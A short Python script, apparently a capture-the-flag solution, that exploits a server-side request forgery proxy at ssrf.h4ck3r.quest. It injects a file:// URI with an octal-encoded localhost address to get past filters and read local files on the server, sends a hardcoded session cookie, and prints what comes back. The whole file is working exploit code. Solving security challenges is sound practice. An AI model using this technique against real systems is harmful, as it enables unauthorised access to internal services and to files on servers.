from sys import argv
from requests import get

URL = "https://ssrf.h4ck3r.quest/proxy?url="
FILE_URI = "file://017700000001"

COOKIE = {
    "session": "!rgdPIDt//j+byYM8vaoQow==?gAWVHQAAAAAAAACMB3Nlc3Npb26UfZSMCHBheWxvYWRzlF2Uc4aULg=="
}

payload = URL

if argv[1].startswith("r"):
    pass
else:
    payload += FILE_URI

payload += argv[2]
data = get(payload, cookies=COOKIE)
print(data.text)